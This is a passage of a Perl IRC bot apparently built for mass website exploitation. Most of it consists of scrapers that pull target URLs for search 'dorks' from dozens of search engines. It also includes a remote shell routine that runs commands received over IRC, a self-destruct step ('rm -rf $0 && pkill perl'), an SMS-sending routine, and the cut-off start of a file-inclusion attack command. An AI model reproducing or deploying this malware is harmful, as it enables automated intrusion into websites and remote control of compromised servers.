            if ($1 !~ /altavista/){
            my $link = $1;
                $link =~ s/<//g;
                $link =~ s/ //g;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub ask() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=50; $i+=1) {
        my $search = ("http://it.ask.com/web?q=".&key($key)."&qsrc=0&o=0&l=dir&qid=EE90DE6E8F5370F363A63EC61228D4FE&page=".$i."&jss=1&dm=all");
        my $res = &search_engine_query($search);
		if ($res !~ /Successiva/) {$i=50;}
        while ($res =~ m/href=\"http:\/\/(.+?)\" onmousedown=\"/g) {
            if ($1 !~ /ask\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahoo(){
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://search.yahoo.com/search?p=".&key($key)."&b=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            if ($1 !~ /yahoo\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub clusty() {
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=10; $b<=500; $b+=10) {
        my $search = ("http://search.yippy.com/search?query=".&key($key)."&input-form=clusty-simple&v:sources=webplus&v:state=root|root-".$b."-10|0&");
        my $res = &search_engine_query($search);
		if ($res !~ /next/) {$b=500;}
        while ($res =~ m/<div class=\"document-header\"><a href=\"http:\/\/(.*?)\"><span class=\"title\">/g) {
            if ($1 !~ /yippy\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub gutser() {
    my @list;
    my $key = $_[0];
    for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://www.goodsearch.com/Search.aspx?Keywords=".&key($key)."&page=".$b."&osmax=0");
        my $res = &search_engine_query($search);
        while ($res =~ m/http:\/\/([^>\"]*)\">/g) {
            if ($1 !~ /goodsearch|good\.is|w3\.org|quantserve/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub google2() {
  my @list;
  my $key = $_[0];
  my $b	  = 0;
  my @doms = ("ae","com.af","com.ag","off.ai","am","com.ar","as","at","com.au","az","ba","com.bd","be","bg","bi","com.bo","com.br","bs","co.bw","com.bz","ca","cd","cg","ch","ci","co.ck","cl","com.co","co.cr","com.cu","de","dj","dk","dm","com.do","com.ec","es","com.et","fi","com.fj","fm","fr","gg","com.gi","gl","gm","gr","com.gt","com.hk","hn","hr","co.hu","co.id","ie","co.il","co.im","co.in","is","it","co.je","com.jm","jo","co.jp","co.ke","kg","co.kr","kz","li","lk","co.ls","lt","lu","lv","com.ly","mn","ms","com.mt","mu","mw","com.mx","com.my","com.na","com.nf","com.ni","nl","no","com.np","nr","nu","co.nz","com.om","com.pa","com.pe","com.ph","com.pk","pl","pn","com.pr","pt","com.py","ro","ru","rw","com.sa","com.sb","sc","se","com.sg","sh","sk","sn","sm","com.sv","co.th","com.tj","tm","to","tp","com.tr","tt","com.tw","com.ua","co.ug","co.uk","com.uy","uz","com.vc","co.ve","vg","co.vi","com.vn","vu","ws","co.za","co.zm");
foreach my $domain (@doms) { $dom = $doms[rand(scalar(@doms))];
    for ($b=1; $b<=200; $b+=10) {
        my $search = ("http://www.google.".$dom."/search?num=50&q=".&key($key)."&start=".$b."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            if ($1 !~ /google/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    } return @list;
}
}

sub exalead() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=1000; $b+=100) {
        my $search = ("http://www.exalead.com/search/web/results/?q=".&key($key)."&elements_per_page=100&start_index=".$b);
        my $res = &search_engine_query($search);
		if ($res =~ m/<span id=\"topNextUrl\">/g) {$b=1000;}
        while ($res =~ m/<a class=\"thumbnail\" href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /exalead/){
                my @grep = &links($link);
                push(@list,@grep);
            }
            }
        }
    return @list;	
}	

sub lycos() { 
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://search.lycos.com/?query=".&key($key)."&page2=".$b."&tab=web&searchArea=web&diktfc=468007302EF7DB9AFE53D4138B848E7B4000D424385F");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\" onmouseover=/g) {
            if ($1 !~ /lycos\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub virgilio() {
  my @list;
  my $key = $_[0];
    for ($b=10; $b<=500; $b+=10) {
        my $search = ("http://ricerca.virgilio.it/ricerca?qs=".&key($key)."&filter=1&site=&lr=&hits=10&offset=".$b);
        my $res = &search_engine_query($search);
		if ($res =~ m/non ha prodotto risultati/i) {$b=500;}
		if ($res =~ m/riconducibile a richieste effettuate/i) {$b=500;}
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" target=\"/g) {
            if ($1 !~ /\.virgilio\.it/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub webde() {
  my @list;
  my $key = $_[0];
    for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://suche.web.de/search/web/?pageIndex=".$b."&su=".&key($key)."&search=Suche&webRb=countryDE");
        my $res = &search_engine_query($search);
		if ($res =~ m/Suchbegriff nicht gefunden/i) {$b=50;}
        while ($res =~ m/<span class=\"url\">http:\/\/(.*?)<\/span>/g) {
            my $link = $1;
            if ($link!~ /suche|web/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub hotbot() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=msn&page=".$b."&diktfc=51964BFDE35DFB6914F9E1E0D7988C3AC0ACB52B58BE");
        my $res = &search_engine_query($search);
		if ($res =~ m/had no web result/i) {$b=50;}
        while ($res =~ m/rel=\"nofollow\" href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /hotbot\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub aol() {
  my @list;
  my $key = $_[0];
    for ($b=2; $b<=50; $b+=1) {
        my $search = ("http://aim.search.aol.com/aol/search?q=".&key($key)."&page=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" property/g) {
            if ($1 !~ /aol\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}

sub sapo(){
    my @list;
	my $key = $_[0];
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".&key($key)."&st=local");
        my $res = &search_engine_query($search);
		if ($res !~ m/Next/i) {$b=50;}
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            if ($1 !~ /\.sapo\.pt/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub duck() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://duckduckgo.com/html/?q=".&key($key)."&t=A&l=en&p=1&s=".$b."&o=json&dc=".$b."&api=d.js");
        my $res = &search_engine_query($search);
		if ($res =~ m/No more results/i) {$b=50;}
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /duckduckgo/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub lygo() {
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=lygo&page2=".$b."&diktfc=51964BFDE35DFB6914F9E1E0D7988C3AC0ACB52B58BE");
        my $res = &search_engine_query($search);
		if ($res =~ m/had no web result/i) {$b=50;}
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"><img/g) {
            if ($1 !~ /hotbot\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yause() {
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://www.yauba.com/?query=".&key($key)."&where=websites&target=websites&con=y&ilang=english&clt=topic&pg=".$b);
        my $res = &search_engine_query($search);
		if ($res !~ m/Next/i) {$b=50;}
        while ($res =~ m/<h1><a rel=\"nofollow\" href=\"http:\/\/(.+?)\" onfocus=/g) {
            if ($1 !~ /yauba\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub baidu() {
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=0; $b<=500; $b+=10) {
        my $search = ("http://www.baidu.com/s?wd=".&key($key)."&pn=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/\" href=\"http:\/\/(.*?)\"  target=/g) {
            if ($1 !~ /baidu\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub kipot() {
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://www.qkport.com/".$b."/web/".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" target=\"_top\"/g) {
            if ($1 !~ /qkport\.com/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub gibla() { #mati#
	my @list;
	my $key = $_[0];
	my $hal = "/search?q=".&key($key);
        my $search = ("http://www.gigablast.com".$hal);
        my $res = &search_engine_query($search);
	while ($res =~ m/Next 10 Results/) {
        $search = ("http://www.gigablast.com".$hal);
        while ($res =~ m/<span class=\"url\">(.+?)><\/span>/g) {
            my $link = $1;
            my @grep = &links($link);
            push(@list,@grep);
		} 
	if ($res =~ m/<center><a href=\"(.*?)\">/) { $hal = $1; }
	$res = &search_engine_query($search);
	}return @list;
}

sub black() {
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://blekko.com/ws/".&key($key)."?ft=&p=".$b);
		my $cek = $b+1;
        my $res = &search_engine_query($search);
		if ($res !~ m/<strong>$b<\/strong>/i) {$b=50;}
        while ($res =~ m/class=\"UrlTitleLine\" href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /blekko/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub onet() { 
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /webcache|query/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub sizuka() {
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=10; $b<=100; $b+=10) {
        my $search = ("http://www.szukacz.pl/szukaj.aspx?ct=polska&pc=polska&q=".&key($key)."&start=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a title=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /szukacz/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub walla() { 
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://search.walla.co.il/?t=0&e=utf&q=".&key($key)."&p=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<td class=sw><a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /walla\.co\.il/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub demos() { 
	my @list;
	my $key = $_[0];
        my $b   = 0;
	for ($b=0; $b<=500; $b+=10) {
        my $search = ("http://search.dmoz.org/search/search?q=".&key($key)."&start=".$b."&type=next&all=yes");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /search|dmoz/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub rose() {
  my @list;
  my $key = $_[0];
  my $b	  = 0;
  my @langs = ("de","nl","fi","ps","da","en","es","fr","it","no","sv","cs","pl","ru");
foreach my $language (@langs) { $lang = $langs[rand(scalar(@langs))];
    for ($b=0; $b<=30; $b+=10) {
        my $search = ("http://euroseek.com/system/search.cgi?language=".$lang."&mode=internet&start=".$b."&string=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" class=/g) {
            if ($1 !~ /euroseek/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
}return @list;
}

sub seznam() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://search.seznam.cz/?q=".&key($key)."&count=10&pId=SkYLl2GXwV0CZZUQcglt&from=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title/g) {
            if ($1 !~ /seznam/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub tiscali() { 
	my @list;
	my $key = $_[0];
	for ($b=0; $b<=500; $b+=10) {
        my $search = ("http://search.tiscali.it/?tiscalitype=web&collection=web&start=".$b."&q=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" onclick/g) {
            if ($1 !~ /tiscali/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub naver() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://web.search.naver.com/search.naver?where=webkr&query=".&key($key)."&docid=0&#9001;=all&f=&srcharea=all&st=s&fd=2&start=".$b."&display=10");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /naver/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sub live {
  my $key = $_[0];
  my @list;
  my $num = 50; my $max = 5000; my $p;
  my $search = "http://search.live.com/results.aspx?q=".&key($key)."&go";
  my $msearch =  "http://search.live.com";
  my $nxsearch;
  my $res = search_engine_query($search);
  if ( $res =~ /<a  class=\"sb_pagN\" href=\"(.*?)\" onmousedown/ ) {
      my $nxsearch = $1;
  }
  while ( $res =~ m/<h3><a href=\"http:\/\/(.*?)\"/g ) {
    my $l = $1 ; if ($l !~ /google/) { push (@list, $l); }
  }
  for ( $p=0;$p<=$max;$p += $num ) {
    $nxsearch = $msearch.htmltosearch($1)."&go";
    $res = search_engine_query("http://search.live.com/results.aspx?q=".&key($key)."&first=".$p."&FORM=PORE");
    while ( $res =~ m/<h3><a href=\"http:\/\/(.*?)\"/g ) {
      my $l = $1 ; if ($l !~ /google/) { push (@list, $l); }
    }
  }
  return @list;
}

sub rakuten() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://websearch.rakuten.co.jp/Web?qt=".&key($key)."&col=OW&lg=all&st=".$b."&svx=101722");
        my $res = search_engine_query($search);
        while ($res =~ m/<a class="sc_result result" href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /rakuten/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub biglobe {
  my $key = $_[0];
  my @list;
  for ($b=1; $b<=500; $b+=10) {
    $num += $num;
    my $search = "http://cgi.search.biglobe.ne.jp/cgi-bin/search_bl_top?start=".$b."&ie=utf8&num=".$num."&q=".&key($key)."&lr=all";
    my $res = search_engine_query($search);
    while ( $res =~ m/<a href=\"http:\/\/(.+?)\"/g ) {
        if ($1 !~ /biglobe/){
	    my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }

        }
    }
    return @list;
}   

sub nova() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
	    $num += $num;
        my $search = ("http://nova.rambler.ru/srch?query=".&key($key)."&page=".$b."&start=".$num);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            if ($1 !~ /rambler|cache/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub najdi() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
	    $num += $num;
        my $search = ("http://www.najdi.si/search.jsp?q=".&key($key)."&o=".$b."&maxHitsPerGroup=".$num);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" onmousedown/g) {
            if ($1 !~ /najdi|cache/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub goo() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://search.goo.ne.jp/web.jsp?STYPE=web&OE=UTF-8&MT=".&key($key)."&IE=UTF-8&FR=".$b."&from=pager");
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" onclick/g) {
            if ($1 !~ /goo/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub uksubmit() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://www.uksubmit.co.uk/index.php?query=".&key($key)."&searchType=Web&page=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href="http:\/\/(.+?)\"/g) {
            if ($1 !~ /uksubmit/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub excite() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
	    $num += $num;
        my $search = ("http://msxml.excite.com/excite/ws/results/Web/".$key."/".$b."/0/0/Relevance/zoom=off/qi=".$num."/qk=20/bepersistence=true/_iceUrlFlag=7?_IceUrl=true");
        my $res = search_engine_query($search);
        while ($res =~ m/status='http:\/\/(.*?)';/g) {
            if ($1 !~ /excite|google|Yahoo/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub amidalla(){
    my @list;
    my $key = $_[0];
    my $b   = 0;
    for ($b=0; $b<=100; $b+=10){
        my $web=("http://www.amidalla.de/cgi-bin/amisearch.cgi?search=".&key($key)."&page=".$b."&break=10&af=2&tld=com&et=2");		
        my $Res=search_engine_query($web);
        while ($Res =~ m/<a href=\"http:\/\/(.+?)\//g){
            if ($1 !~ /amidalla/){
                my $k=$1;
                my @grep=links($k);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub buscar() {
    my @list;
    my $key = $_[0];
    for (my $b=1; $b<=1000; $b+=10){
        my $search = ("http://buscar.ozu.es/index.php?etq=web&q=".&key($key)."&pag=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/([^>\"]*)/g) {
            my $link = $1;
            if ($link !~ /buscar/){
                $link =~ s/<//g;
                $link =~ s/ //g;
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub sogou() {
    my @list;
    my $key = $_[0];
    for (my $b=1; $b<=1000; $b+=10){
        my $search = ("http://www.sogou.com/web?query=".&key($key)."&page=".$b."&p=40040100&dp=1&w=01019900&dr=1&_asf=www.sogou.com&_ast=1313253760");
        my $res = search_engine_query($search);
        while ($res =~ m/<a name="dttl" target="_blank" href="http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link !~ /sogou/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub interia() {
    my @list;
    my $key = $_[0];
    for ($b = 0;$b<= 100; $b+= 10) {
           my $search = ( "http://www.google.interia.pl/szukaj?q=".&key($key)."&s=szukaj&w=sw&szukaj=&p=".$b);
           my $res = search_engine_query($search);
           while ($res =~ m/text-decoration: none;\">http:\/\/(.+?)\/(.*)<\/a>/g) {
                my $link = $1;
                if ($link!~ /google|interia/) {
                   my @grep=links($link);
                   push(@list,@grep);
           }
       }
   }
  return @list;
}

sub snz() {
    my @list;
    my $key = $_[0];
    for (my $b=1; $b<=1000; $b+=100) {
        my $search = ("http://searchnz.co.nz/search.aspx?q=".&key($key)."&np=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/(.+?)\//g) {
            my $link = $1;
            if ($link!~ /searchnz/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yandex(){
    my @list;
    my $key = $_[0];
    for ($b=0; $b<=50; $b+=10){
        my $search=("http://yandex.ru/yandsearch?p=".$b."&text=".&key($key)."&lr=84");
        my $res= search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /yandex/ ){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
   return @list;
}

sub joeant(){
    my @list;
    my $key = $_[0];
    for ($b=0; $b<=50; $b+=10){
        my $search=("http://www.joeant.com/DIR/search.php?keywords=".&key($key)."&page=".$b."&limit=10");
        my $res= search_engine_query($search);
        while ($res =~ m/<a href=\http:\/\/(.*?)\//g) {
            my $link = $1;
            if ($link!~ /joeant/ ){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
   return @list;
}

sub terra(){
    my @list;
    my $key = $_[0];
    for ($b=0; $b<=50; $b+=10){
        my $search=("http://buscador.terra.com/Results.aspx?ca=a&source=Search&query=".$key);
        my $res= search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /terra/ ){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
   return @list;
}

sub youdao() { 
	my @list;
	my $key = $_[0]; {
        my $search = ("http://www.youdao.com/search?q=".&key($key)."&start=10&ue=utf8&keyfrom=".$b."&lq=".&key($key)."&timesort=0");
        my $res = search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {
            if ($1 !~ /youdao/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub amfibi() { 
	my @list;
	my $key = $_[0]; {
        my $search = ("http://www.amfibi.com/search?query=".&key($key)."&start=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {
            if ($1 !~ /amfibi|cache/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bigclique() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
	    $num += $num;
        my $search = ("http://www.bigclique.com/search.jsp?query=".&key($key)."&hitsPerPage=10&start=".$num."&hitsPerSite=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href="http:\/\/(.+?)\"/g) {
            if ($1 !~ /bigclique|cached/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub dancefloor() { 
	my @list;
	my $key = $_[0];
	for ($b=1; $b<=500; $b+=10) {
	    $num += $num;
        my $search = ("http://www.dancefloorhireuk.co.uk/events/search.php?query=".&key($key)."&start=".$b."&search=1&results=10&type=and&domain=");
        my $res = search_engine_query($search);
        while ($res =~ m/<a href="http:\/\/(.+?)\"/g) {
            if ($1 !~ /dancefloor|query/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

#########################################

sub clean() {
    my @cln = ();
    my %visit = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visit{$element}++;
        push @cln, $element;
    }
    return @cln;
}

sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/\?/\%3F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
	$dork =~ s/@/\%40/g;
	$dork =~ s/\[/\%5B/g;
	$dork =~ s/\]/\%5D/g;
	$dork =~ s/\?/\%3F/g;
	$dork =~ s/\=/\%3D/g;
	$dork =~ s/\|/\%7C/g;
    return $dork;
}

sub links() {
    my @list;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/$1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push(@list,$link,$host,$hdir);
    return @list;
}

sub search_engine_query($) {
    my $url = $_[0];
    $url =~ s/http:\/\///;
    my $host = $url;
    my $query = $url;
    my $page  = "";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    if ($query eq "") { $query = "/"; }
        eval {
            my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
            print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: $uagent\r\n\r\n";
            my @pages = <$sock>;
            $page = "@pages";
            close($sock);
        };
    return $page;
}

#########################################

sub shell() {
    my $path = $_[0];
    my $cmd = $_[1];
    if ($cmd =~ /cd (.*)/) {
        chdir("$1") || &msg("$path","4,1No such file or directory");
        return;
    }
    elsif ($pid = fork) { waitpid($pid, 0); }
    else { if (fork) { exit; } else {
        my @output = `$cmd 2>&1 3>&1`;
        my $c = 0;
        foreach my $output (@output) {
            $c++;
            chop $output;
            &msg("$path","$output");
            if ($c == 5) { $c = 0; sleep 2; }
        }
        exit;
    }}
}

sub isAdmin() {
    my $status = 0;
    my $nick = $_[0];
    if ($nick eq $admin) { $status = 1; }
    return $status;
}
sub SIGN() {
if (($powered !~ /s/)||($mail !~ /com/)) {
print "\nHuangango!!! Hulodu Ngana!! Tak Usah Rubah Lagi Tahede!!!\n\n"; 
exec("rm -rf $0 && pkill perl");
}
}
sub msg() {
    return unless $#_ == 1;
    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
}

sub nick() {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}

sub notice() {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}

sub sendSMS {

	my $no = $_[0];
	my $pesan = $_[1];

	my $site = "sms.eligiblestore.com";
	my $paths = "/";
	
	############open konrksi#############
	my $socksms = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$site",PeerPort=>"80");

	###############cek apakah koneksi berhasil###############
	if(!$socksms) {die("gak bisa akses $site port 80\r\n");}

	#############request data##############
	print $socksms "GET $paths http/1.1\r\n";
	print $socksms "Host: $site\r\n";
	print $socksms "Accept: */*\r\n";
	print $socksms "User-Agent: Mozilla Firefox\r\n";
	print $socksms "Connection: Close\r\n";
	print $socksms "\r\n";


	#############ambil data,masukan ke dalam ariable array##############
	my @data = <$socksms>;

	##################close socket###################
	close($socksms);

	#$data = join("",@data);
	#print $data;

								########ambil pertanyaan##########
	#@spertanyaan1 = split("jawab ini : ",$data);
		#print @pertanyaan1[1];
	#@spertanyaan2 = split(" =",@spertanyaan1[1]);
		#print @spertanyaan2[0];
	#@spertanyaan3 = split(" ",@spertanyaan2[0]);
		#print "angka1= ".@spertanyaan3[0]."\r\n";
		#print "angka2= ".@spertanyaan3[2]."\r\n";
	#$jawaban = @spertanyaan3[0]+@spertanyaan3[2];
		#print "jawaban = $jawaban\r\n";


		
		###################ambil marguardcode################
	#@sguard1 = split("name='mathguard_code' value='",$data);
		#print @sguard1[1];
	#@sguard2 = split("' /><br />",@sguard1[1]);
		#print @sguard2[0];
	#$sguard = @sguard2[0];

	############devinisikan data yg diperlukan#############
	$action = "/";
	$Phonenumbers = $no;
	$Text = $pesan;
	#$mathguard_answer = $jawaban;
	#$mathguard_code = $sguard;
	$via = "main";
	$TOMBOL = "Submit";

	#################buat data yg akan di post##############
#	$Post = "Phonenumbers=".$Phonenumbers."&Text=".$Text."&mathguard_answer=".$mathguard_answer."&mathguard_code=".$mathguard_code."&TOMBOL=".$TOMBOL;
	$Post = "sendtoext=".$Phonenumbers."&smstext=".$Text."&socket=".$via."&submit=".$TOMBOL;
	$panjang = length $Post;


	###############kirim sms###############
	$socksms = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$site",PeerPort=>"80");
	print $socksms "POST $action http/1.1\r\n";
	print $socksms "Host: $site\r\n";
	print $socksms "Accept: */*\r\n";
	print $socksms "User-Agent: Mozilla Firefox\r\n";
	print $socksms "Content-type: application/x-www-form-urlencoded\r\n";
	print $socksms "Content-length: ".$panjang."\r\n";
	print $socksms "Connection: Close\r\n\r\n";
	print $socksms $Post;

	@hasil = <$socksms>;
	close($socksms);

	$hasil = join("",@hasil);
	if($hasil=~ /SMS sent to/){
		return 1;
		
	}
	else{
		return 0;
	}
}

sub cmdlfi() {
my $browser = LWP::UserAgent->new;
